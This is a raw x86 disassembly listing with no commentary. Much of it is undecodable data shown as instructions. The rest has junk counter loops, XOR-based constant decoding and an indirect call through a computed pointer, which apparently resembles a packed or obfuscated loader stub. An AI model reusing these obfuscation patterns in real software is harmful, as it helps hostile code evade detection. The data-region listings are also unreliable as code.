  4069e0:	jo     0x406a48
  4069e2:	(bad)  
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	fs cli 
  4069eb:	ret    0x414d
  4069ee:	dec    ebx
  4069ef:	ja     0x406a28
  4069f1:	(bad)  
  4069f2:	cli    
  4069f3:	ss jo  0x406982
  4069f6:	mov    ah,0x48
  4069f8:	inc    ebx
  4069f9:	popa   
  4069fa:	clc    
  4069fb:	pop    esi
  4069fc:	mov    al,0xba
  4069fe:	jge    0x4069ec
  406a00:	fs gs cli 
  406a03:	popf   
  406a04:	and    DWORD PTR [edi+0x70],ebp
  406a07:	mov    dl,0xc6
  406a09:	cmp    DWORD PTR [ebx],edi
  406a0b:	clc    
  406a0c:	popf   
  406a0d:	sar    BYTE PTR [edi],cl
  406a0f:	lds    eax,FWORD PTR [esi+0x8]
  406a12:	(bad)  
  406a13:	sub    eax,edi
  406a15:	sbb    dl,al
  406a17:	aaa    
  406a18:	jns    0x406a63
  406a1a:	retf   
  406a1b:	jg     0x406a0a
  406a1d:	push   ebx
  406a1e:	add    al,cl
  406a20:	cmp    eax,0xd559af71
  406a25:	xlat   BYTE PTR ds:[ebx]
  406a26:	fwait
  406a27:	mov    ds:0x21cf2dc5,eax
  406a2c:	cmp    al,0x51
  406a2e:	add    al,0xdc
  406a30:	fisub  DWORD PTR [esi-0x7b0d25eb]
  406a36:	jmp    0x406ab1
  406a38:	hlt    
  406a39:	stc    
  406a3a:	test   eax,0x4fb8f9bd
  406a3f:	jae    0x4069de
  406a41:	pop    esi
  406a42:	inc    eax
  406a43:	pop    ebp
  406a44:	sub    DWORD PTR [ebp+0x74],0x5f666dfc
  406a4b:	jo     0x406a68
  406a4d:	mov    DWORD PTR [ebx],esi
  406a4f:	mov    ebp,0xb03394fe
  406a54:	das    
  406a55:	mov    ch,0xe
  406a57:	ret    0xc7e8
  406a5a:	adc    bh,BYTE PTR [eax]
  406a5c:	mov    dl,0xb0
  406a5e:	mov    fs,WORD PTR [eax-0x2f741b00]
  406a64:	dec    ebp
  406a65:	in     al,dx
  406a66:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  406a68:	(bad)  [ebx+0x17]
  406a6b:	inc    ecx
  406a6c:	cmc    
  406a6d:	pop    edi
  406a6e:	adc    BYTE PTR [eax+0x46da2980],bl
  406a74:	jle    0x406a1a
  406a76:	cld    
  406a77:	in     al,0xa5
  406a79:	pop    edx
  406a7a:	test   al,0x23
  406a7c:	pop    eax
  406a7d:	outs   dx,BYTE PTR ds:[esi]
  406a7e:	pop    ebp
  406a7f:	pop    ecx
  406a80:	popa   
  406a81:	and    ch,BYTE PTR [edx+0x6]
  406a84:	xchg   esi,eax
  406a85:	aaa    
  406a86:	ja     0x406ad2
  406a88:	aad    0x10
  406a8a:	in     al,dx
  406a8b:	cwde   
  406a8c:	lods   al,BYTE PTR ds:[esi]
  406a8d:	fist   DWORD PTR [ecx+0x7f4ed724]
  406a93:	mov    eax,0x915064e6
  406a98:	xlat   BYTE PTR ds:[ebx]
  406a99:	adc    al,0x32
  406a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a9c:	outs   dx,DWORD PTR ds:[esi]
  406a9d:	mov    edi,0x75fa76e
  406aa2:	cmp    eax,0x3311661d
  406aa7:	int3   
  406aa8:	and    al,0xcf
  406aaa:	mov    al,BYTE PTR [ebp+0x14]
  406aad:	and    DWORD PTR [ebp+0x6c],0xffffff83
  406ab1:	add    dl,BYTE PTR [eax]
  406ab3:	inc    eax
  406ab4:	imul   eax,DWORD PTR [ecx],0xb4889a69
  406aba:	cli    
  406abb:	sub    edx,DWORD PTR [edx]
  406abd:	dec    eax
  406abe:	jge    0x406af2
  406ac0:	jae    0x406b27
  406ac2:	xchg   ebx,eax
  406ac3:	mov    al,0x64
  406ac5:	mov    edx,0x51d97e11
  406aca:	fisttp QWORD PTR [edx-0x61]
  406acd:	scas   eax,DWORD PTR es:[edi]
  406ace:	enter  0x5e11,0xca
  406ad2:	push   ebx
  406ad3:	push   ebp
  406ad4:	xor    eax,0x178be908
  406ad9:	jns    0x406a95
  406adb:	jle    0x406ad6
  406add:	test   eax,0x5d09757b
  406ae2:	sbb    DWORD PTR [ebx-0x55],ecx
  406ae5:	leave  
  406ae6:	lock xor edx,DWORD PTR [edi]
  406ae9:	lock push ds
  406aeb:	das    
  406aec:	and    bh,BYTE PTR [esi-0x780bf341]
  406af2:	adc    al,0x87
  406af4:	push   ecx
  406af5:	(bad)  
  406af6:	je     0x406ae1
  406af8:	ins    DWORD PTR es:[edi],dx
  406af9:	(bad)  [eax]
  406afb:	cdq    
  406afc:	push   0x4e
  406afe:	and    bh,BYTE PTR [ebx]
  406b00:	out    dx,al
  406b01:	mov    al,0xa5
  406b03:	jge    0x406b2b
  406b05:	adc    ah,BYTE PTR [esi+0x67]
  406b08:	jp     0x406b4b
  406b0a:	pop    edx
  406b0b:	mov    edi,0xc1a0e9b3
  406b10:	sbb    esi,DWORD PTR [ebp-0x1c]
  406b13:	lea    ebp,[ecx+0x32]
  406b16:	xlat   BYTE PTR ds:[ebx]
  406b17:	pop    edi
  406b18:	jmp    0xdecdc73c
  406b1d:	xchg   edi,eax
  406b1e:	adc    bl,BYTE PTR [ebx]
  406b20:	sub    ebp,DWORD PTR [edx-0x354e839e]
  406b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b27:	cs push ebp
  406b29:	jle    0x406b00
  406b2b:	cmc    
  406b2c:	mov    ecx,0x930f0b56
  406b31:	lds    edi,FWORD PTR [ebp+0x404dfaec]
  406b37:	jo     0x406b61
  406b39:	mov    al,ds:0xbfd7739a
  406b3e:	hlt    
  406b3f:	arpl   WORD PTR [esi],si
  406b41:	mov    ebx,?
  406b43:	mov    ds:0xd4687fdc,eax
  406b48:	outs   dx,BYTE PTR ds:[esi]
  406b49:	sti    
  406b4a:	pop    ebp
  406b4b:	stos   DWORD PTR es:[edi],eax
  406b4c:	fidivr WORD PTR [ecx+0x59]
  406b4f:	and    DWORD PTR [ebx+0x32],ebx
  406b52:	adc    DWORD PTR [ecx+edx*4],esi
  406b55:	(bad)  
  406b56:	aam    0xc2
  406b58:	outs   dx,DWORD PTR cs:[esi]
  406b5a:	loopne 0x406b3e
  406b5c:	dec    ecx
  406b5d:	add    DWORD PTR [ecx-0x13],eax
  406b60:	cs inc ebx
  406b62:	ret    
  406b63:	ror    DWORD PTR [ecx+0x5b],0xf8
  406b67:	and    al,0x69
  406b69:	fimul  WORD PTR ss:[edi+0x20954fbd]
  406b70:	std    
  406b71:	or     BYTE PTR [ebx-0x40fa593a],0x1b
  406b78:	xor    esi,DWORD PTR [edi-0x5e]
  406b7b:	push   0xffffffcc
  406b7d:	sahf   
  406b7e:	and    ecx,DWORD PTR [edx-0x4fd8dee8]
  406b84:	(bad)  
  406b86:	xchg   DWORD PTR [ebp+0x20d031dc],eax
  406b8c:	loopne 0x406b67
  406b8e:	sub    al,0xc3
  406b90:	inc    ebp
  406b91:	cld    
  406b92:	sbb    al,0x62
  406b94:	xchg   ebx,eax
  406b95:	repnz xchg ebx,eax
  406b97:	or     al,BYTE PTR [ebp+0x49]
  406b9a:	mov    dl,0x48
  406b9c:	xchg   edx,eax
  406b9d:	cwde   
  406b9e:	mov    DWORD PTR [edx-0x7c],esp
  406ba1:	jmp    0x39e4:0xcff732b0
  406ba8:	sbb    edx,DWORD PTR [ebp+ebx*1+0x3b58e2eb]
  406baf:	dec    edi
  406bb0:	lock (bad) 
  406bb2:	retf   0x25d2
  406bb5:	mov    ebp,0x60109352
  406bba:	mov    es,WORD PTR [eax-0x2255ebfd]
  406bc0:	mov    bh,0xe2
  406bc2:	outs   dx,BYTE PTR ds:[esi]
  406bc3:	adc    ebx,DWORD PTR [ebx+0x72a402ef]
  406bc9:	(bad)  
  406bca:	test   eax,0x330c5f9d
  406bcf:	loopne 0x406b8b
  406bd1:	cmp    BYTE PTR [esi+0x6c],al
  406bd4:	(bad)  
  406bd5:	mov    ch,0xe3
  406bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd8:	jnp    0x406b60
  406bda:	push   eax
  406bdb:	lods   eax,DWORD PTR ds:[esi]
  406bdc:	xchg   BYTE PTR [ecx],ah
  406bde:	pop    ecx
  406bdf:	hlt    
  406be0:	cmp    ebx,esp
  406be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be3:	jns    0x406bee
  406be5:	add    ch,BYTE PTR [eax-0x5a]
  406be8:	sti    
  406be9:	mov    al,ds:0x661cc3f3
  406bee:	dec    esp
  406bef:	mov    esi,0x5550addf
  406bf4:	mov    dl,0xb6
  406bf6:	cmp    DWORD PTR [ebp-0x43],edx
  406bf9:	nop
  406bfa:	push   ebp
  406bfb:	pop    edi
  406bfc:	or     al,BYTE PTR [edi]
  406bfe:	mov    ah,0xa7
  406c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c01:	dec    edi
  406c02:	pop    ds
  406c03:	(bad)  
  406c04:	mov    esp,0x770620a4
  406c09:	std    
  406c0a:	sub    al,0xb7
  406c0c:	adc    al,0x8f
  406c0e:	mov    WORD PTR [esi-0x58338cee],gs
  406c14:	dec    esi
  406c15:	rcr    BYTE PTR [ebx+edx*2-0x50f09376],1
  406c1c:	adc    al,0xa0
  406c1e:	cmp    DWORD PTR [esi+eiz*1],eax
  406c21:	mov    eax,0x1c517098
  406c26:	mov    BYTE PTR [esi+eax*2],cl
  406c29:	clc    
  406c2a:	dec    ecx
  406c2b:	retf   
  406c2c:	das    
  406c2d:	sbb    ch,dl
  406c2f:	stc    
  406c30:	(bad)  
  406c31:	fcmovne st,st(1)
  406c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c34:	jmp    0x21f:0x92a8de1c
  406c3b:	push   es
  406c3c:	dec    esp
  406c3d:	sbb    BYTE PTR [edx],ah
  406c3f:	cmp    al,0xa0
  406c41:	or     BYTE PTR [ebx-0x60],0x3d
  406c45:	cli    
  406c46:	xor    BYTE PTR [edx-0xa],dl
  406c49:	pop    edx
  406c4a:	je     0x406eec
  406c50:	push   DWORD PTR ds:0x413cb6
  406c56:	push   DWORD PTR ds:0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xab1e2bde
  406c81:	popa   
  406c82:	cmp    al,bh
  406c84:	ret    0x7e7e
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	out    dx,eax
  406c8c:	add    BYTE PTR [ebx],ch
  406c8e:	in     eax,dx
  406c8f:	cwde   
  406c90:	(bad)  
  406c91:	in     al,0x42
  406c93:	leave  
  406c94:	dec    esi
  406c95:	ss out dx,al
  406c97:	mov    esi,0x747d99a9
  406c9c:	ins    BYTE PTR es:[edi],dx
  406c9d:	call   0x2cee:0xac4e0d0c
  406ca4:	stc    
  406ca5:	fisttp WORD PTR [edi+0x6ea298ea]
  406cab:	add    DWORD PTR [edi+0x44],edi
  406cae:	pop    ecx
  406caf:	int3   
  406cb0:	ss mov esp,0xf0cb91b6
  406cb6:	dec    eax
  406cb7:	dec    edi
  406cb8:	out    0xca,eax
  406cba:	xchg   edx,ecx
  406cbc:	mov    ds:0xe5cb704f,eax
  406cc1:	mov    edi,0xfddf0d7f
  406cc6:	cmp    dl,bh
  406cc8:	push   eax
  406cc9:	or     ah,BYTE PTR [eax]
  406ccb:	mov    eax,ds:0x448f0922
  406cd0:	jg     0x406ce7
  406cd2:	stc    
  406cd3:	cmp    edi,DWORD PTR [eax-0x32a55b3b]
  406cd9:	retf   0xc5e
  406cdc:	mov    edx,eax
  406cde:	cmp    BYTE PTR [ebp-0x4302ed4c],dl
  406ce4:	push   ds
  406ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce6:	mov    es,WORD PTR [eax-0x2c4b8fab]
  406cec:	ins    DWORD PTR es:[edi],dx
  406ced:	loop   0x406cb8
  406cef:	fsub   DWORD PTR [edi+0x7dc83ab3]
  406cf5:	fild   DWORD PTR [ecx]
  406cf7:	jp     0x406d6c
  406cf9:	push   0xffffff98
  406cfb:	fwait
  406cfc:	mov    esi,0x485eeaf0
  406d01:	rcr    ebx,0x3e
  406d04:	in     eax,0x42
  406d06:	out    dx,al
  406d07:	mov    edx,0xfd53d7a5
  406d0c:	enter  0x452b,0xea
  406d10:	fdiv   DWORD PTR [ecx-0x55]
  406d13:	fldcw  WORD PTR [ecx+ebp*2-0x45]
  406d17:	xchg   ebx,eax
  406d18:	adc    BYTE PTR [edx+0x20],ah
  406d1b:	test   al,0x26
  406d1d:	out    dx,eax
  406d1e:	xchg   edi,eax
  406d1f:	jae    0x406cd2
  406d21:	and    ebp,DWORD PTR [ebp+0x642faaa2]
  406d27:	in     al,dx
  406d28:	stos   DWORD PTR es:[edi],eax
  406d29:	fsub   DWORD PTR [ebp-0x61]
  406d2c:	sbb    DWORD PTR [edx],eax
  406d2e:	test   BYTE PTR [ebx+0x791127a7],ch
  406d34:	mov    dl,BYTE PTR [esi]
  406d36:	test   DWORD PTR [ecx-0x4d],edx
  406d39:	outs   dx,DWORD PTR ds:[esi]
  406d3a:	scas   al,BYTE PTR es:[edi]
  406d3b:	test   eax,0xd179a2a7
  406d40:	push   ebx
  406d41:	call   0xb2812cb0
  406d46:	fisttp QWORD PTR ds:0xcc6445cb
  406d4c:	aad    0x9a
  406d4e:	nop
  406d4f:	adc    DWORD PTR [ebp-0x1],edi
  406d52:	ficomp WORD PTR [edi-0x6555bab2]
  406d58:	push   cs
  406d59:	(bad)  
  406d5a:	cmp    eax,DWORD PTR [edi]
  406d5c:	outs   dx,BYTE PTR ds:[esi]
  406d5d:	sub    eax,0x34ef7f51
  406d62:	mov    ds:0xbaff2d9c,al
  406d67:	popf   
  406d68:	int3   
  406d69:	pop    edx
  406d6a:	mov    ds:0x1e62761,eax
  406d6f:	cs into 
  406d71:	xor    bh,BYTE PTR [eax]
  406d73:	or     edx,DWORD PTR [ecx+0x70]
  406d76:	dec    esi
  406d77:	mov    bl,0xeb
  406d79:	add    BYTE PTR [ebp-0x7d62a496],ch
  406d7f:	daa    
  406d80:	pop    esp
  406d81:	fdivr  st,st(6)
  406d83:	cwde   
  406d84:	rol    BYTE PTR [ebx+0x14320c1e],1
  406d8a:	push   0xffffffbb
  406d8c:	push   edi
  406d8d:	cli    
  406d8e:	lods   eax,DWORD PTR ds:[esi]
  406d8f:	inc    ebp
  406d90:	inc    ebp
  406d91:	or     al,0x39
  406d93:	adc    eax,0x5e371abe
  406d98:	and    eax,0xf6be67d8
  406d9d:	xor    dh,BYTE PTR [edi-0x12]
  406da0:	jge    0x406e10
  406da2:	sti    
  406da3:	inc    ecx
  406da4:	cmp    edi,ebp
  406da6:	mov    ebp,0xb7c3d9f7
  406dab:	dec    eax
  406dac:	fwait
  406dad:	das    
  406dae:	int3   
  406daf:	sub    esi,DWORD PTR [ecx-0x7c02e9e5]
  406db5:	push   cs
  406db6:	jecxz  0x406db9
  406db8:	aad    0x9e
  406dba:	dec    eax
  406dbb:	ss out dx,eax
  406dbd:	push   cs
  406dbe:	xchg   BYTE PTR [ebx],bl
  406dc0:	int3   
  406dc1:	shl    BYTE PTR [edx-0x3b],1
  406dc4:	sbb    bl,bl
  406dc6:	(bad)  
  406dc7:	and    al,BYTE PTR [ebx-0x74343887]
  406dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dce:	ror    BYTE PTR [eax+edx*4-0x758ab5f9],1
  406dd5:	outs   dx,BYTE PTR ds:[esi]
  406dd6:	data16 rcl BYTE PTR [esi-0x12179c85],cl
  406ddd:	(bad)  
  406dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ddf:	pushf  
  406de0:	jo     0x406dec
  406de2:	retf   0x4af3
  406de5:	sbb    BYTE PTR [ecx],cl
  406de7:	test   eax,0x158371e8
  406dec:	push   ds
  406ded:	lods   al,BYTE PTR ds:[esi]
  406dee:	imul   ebx,DWORD PTR [ecx+edx*4-0x4e],0xece34171
  406df6:	loope  0x406d91
  406df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406df9:	add    DWORD PTR [edi],esp
  406dfb:	and    dh,bl
  406dfd:	inc    ebp
  406dfe:	cmp    esi,DWORD PTR [edi-0x3b]
  406e01:	fnstcw WORD PTR [edx]
  406e03:	jp     0x406ddf
  406e05:	mov    dh,0xe3
  406e07:	adc    eax,0x6ee2faad
  406e0c:	xchg   esp,eax
  406e0d:	mov    eax,ds:0x6ab3c388
  406e12:	pop    ecx
  406e13:	pushf  
  406e14:	sbb    al,0x21
  406e16:	xor    al,BYTE PTR [ebp+0x7860bad9]
  406e1c:	jae    0x406de6
  406e1e:	push   edi
  406e1f:	pop    edi
  406e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e21:	call   0xcfdf:0x87311561
  406e28:	fmul   st,st(7)
  406e2a:	pop    esp
  406e2b:	enter  0xdd14,0x37
  406e2f:	inc    esi
  406e30:	in     eax,dx
  406e31:	xor    al,0x7c
  406e33:	pop    edx
  406e34:	adc    eax,esp
  406e36:	inc    esp
  406e37:	leave  
  406e38:	mov    BYTE PTR [edi+0x62da8163],bh
  406e3e:	xchg   ebp,eax
  406e3f:	sub    esp,DWORD PTR [eax]
  406e41:	fwait
  406e42:	mov    dl,0x1b
  406e44:	push   0xffffffd1
  406e46:	and    esp,DWORD PTR [ebp*4-0x589d92e9]
  406e4d:	cdq    
  406e4e:	adc    eax,0x6417c6f3
  406e53:	adc    dl,BYTE PTR [ebp+ecx*8+0x6f791a52]
  406e5a:	or     al,dh
  406e5c:	outs   dx,BYTE PTR ds:[esi]
  406e5d:	data16 scas al,BYTE PTR es:[edi]
  406e5f:	cmp    eax,0x4c0ecf67
  406e64:	lods   al,BYTE PTR ds:[esi]
  406e65:	pop    ecx
  406e66:	pop    edi
  406e67:	jg     0x406e49
  406e69:	dec    eax
  406e6a:	sub    DWORD PTR [ecx-0x34],ecx
  406e6d:	jl     0x406e95
  406e6f:	nop
  406e70:	call   0xb5fb:0x3c8c9116
  406e77:	xchg   esp,eax
  406e78:	inc    esi
  406e79:	pop    eax
  406e7a:	sbb    al,al
  406e7c:	in     eax,dx
  406e7d:	stos   DWORD PTR es:[edi],eax
  406e7e:	cld    
  406e7f:	adc    BYTE PTR [ebx+0x3c7aa08a],bh
  406e85:	jb     0x406ef2
  406e87:	dec    ebp
  406e88:	fbstp  TBYTE PTR [ebx]
  406e8a:	hlt    
  406e8b:	je     0x406e4f
  406e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e8e:	retf   
  406e8f:	popf   
  406e90:	jge    0x406ebd
  406e92:	mov    ch,0x9d
  406e94:	push   cs
  406e95:	lea    ebp,[esi-0x7e225e47]
  406e9b:	lock retf 0xd02a
  406e9f:	lea    edi,[ebx+0x39fa15dc]
  406ea5:	xchg   ecx,eax
  406ea6:	and    dl,BYTE PTR [esi+0x3e]
  406ea9:	inc    edx
  406eaa:	mov    ds,WORD PTR [ebx+0x166409d4]
  406eb0:	jmp    0x406e8b
  406eb2:	out    0x88,al
  406eb4:	scas   al,BYTE PTR es:[edi]
  406eb5:	nop
  406eb6:	ins    DWORD PTR es:[edi],dx
  406eb7:	and    bl,BYTE PTR [edi+0xa]
  406eba:	ret    0x47b4
  406ebd:	add    al,0x0
  406ebf:	dec    esi
  406ec0:	in     eax,dx
  406ec1:	add    DWORD PTR [ebx*1-0x6a943515],0xffffff9b
  406ec9:	nop
  406eca:	in     eax,dx
  406ecb:	loop   0x406ee5
  406ecd:	sbb    eax,0x16eb243b
  406ed2:	xchg   ecx,eax
  406ed3:	push   cs
  406ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ed5:	mov    dl,0xd1
  406ed7:	inc    edx
  406ed8:	ins    DWORD PTR es:[edi],dx
  406ed9:	and    al,0x3
  406edb:	repnz fwait
  406edd:	repz or bh,0x3d
  406ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee2:	xlat   BYTE PTR ds:[ebx]
  406ee3:	and    edi,ebx
  406ee5:	je     0x406edf
  406ee7:	sbb    DWORD PTR [esi],ecx
  406ee9:	and    BYTE PTR [eax],bh
  406eeb:	out    0x8b,al
  406eed:	inc    ebp
  406eee:	adc    cl,cl
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
